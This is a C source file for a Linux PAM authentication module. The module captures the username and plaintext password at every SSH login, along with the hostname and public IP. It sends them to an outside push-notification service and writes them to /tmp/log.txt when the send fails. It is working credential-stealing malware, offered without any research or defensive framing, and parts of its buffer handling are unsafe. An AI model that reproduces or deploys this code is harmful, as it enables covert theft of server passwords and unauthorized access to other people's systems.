#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <regex.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <unistd.h>

char* getsubstr(char *s, regmatch_t *pmatch)
{
        static char buf[100] = {0};
        memset(buf, 0, sizeof(buf));
        memcpy(buf, s+pmatch->rm_so, pmatch->rm_eo - pmatch->rm_so);
        return buf;
}

size_t write_callback(char *ptr, size_t size, size_t nmemb, void **stream)
{
    int len = size * nmemb;
    int written = len;
    regmatch_t pmatch;
    regex_t reg;
    const char *pattern="[0-9]{1,}[.][0-9]{1,}[.][0-9]{1,}[.][0-9]{1,}";
    regcomp(&reg,pattern,REG_EXTENDED);
    int status=regexec(&reg,ptr,1,&pmatch,0);
    if(status==REG_NOMATCH){
       *stream="NULL";
    }else if(pmatch.rm_so!=-1){
       char *ip=getsubstr(ptr,&pmatch);
       *stream=ip;
    }
    return written;
}


void sendMessage(char (*message)[]) {
    char token[200]="";
    char topic[100]="";
    char url[500];
    char jsondata[500];
    char szJsonData[1024];
    char ipurl[200]="https://ip.fm";
    char *httpdata;

    CURL *curl;
    CURLcode return_code;
    struct curl_slist *headers=NULL;
    headers=curl_slist_append(headers,"Content-Type: application/json");
    headers=curl_slist_append(headers,"User-Agent: curl/7.68.0");
    curl=curl_easy_init();
    
    if(curl){
        printf("get ip\n");
        curl_easy_setopt(curl,CURLOPT_WRITEFUNCTION,write_callback);
        curl_easy_setopt(curl,CURLOPT_WRITEDATA,&httpdata);
        curl_easy_setopt(curl,CURLOPT_URL,ipurl);
        return_code=curl_easy_perform(curl);
    }
    
    memset(szJsonData,0,sizeof(szJsonData));
    snprintf(url,600,"http://www.pushplus.plus/send/%s",token);
    snprintf(jsondata,600,"{\"title\":\"ssh password\",\"content\":\"Ip:%s\n%s\",\"topic\":\"%s\"}",httpdata,*message,topic);
    strcpy(szJsonData,jsondata);

    if(curl){
        curl_easy_setopt(curl,CURLOPT_HTTPHEADER,headers);
        curl_easy_setopt(curl,CURLOPT_POSTFIELDS,szJsonData);
        curl_easy_setopt(curl,CURLOPT_URL,url);
        return_code=curl_easy_perform(curl);
    }
    if(return_code!=CURLE_OK){
	FILE *file=fopen("/tmp/log.txt","a+");
 	fputs(*message,file);
 	fclose(file);
    }
 }	

PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
  return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
  return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
  int retval;
  const char* username;
  const char* password;
  char message[1024];
  char hostname[128];
  retval = pam_get_user(pamh, &username, "Username: ");
  pam_get_item(pamh, PAM_AUTHTOK, (void *) &password);
  if (retval != PAM_SUCCESS) {
    return retval;
  }
  gethostname(hostname, sizeof hostname);
  snprintf(message,2048,"Hostname: %s\nUsername %s\nPassword: %s\n",hostname,username,password);
  sendMessage(&message);
  return PAM_SUCCESS;
}



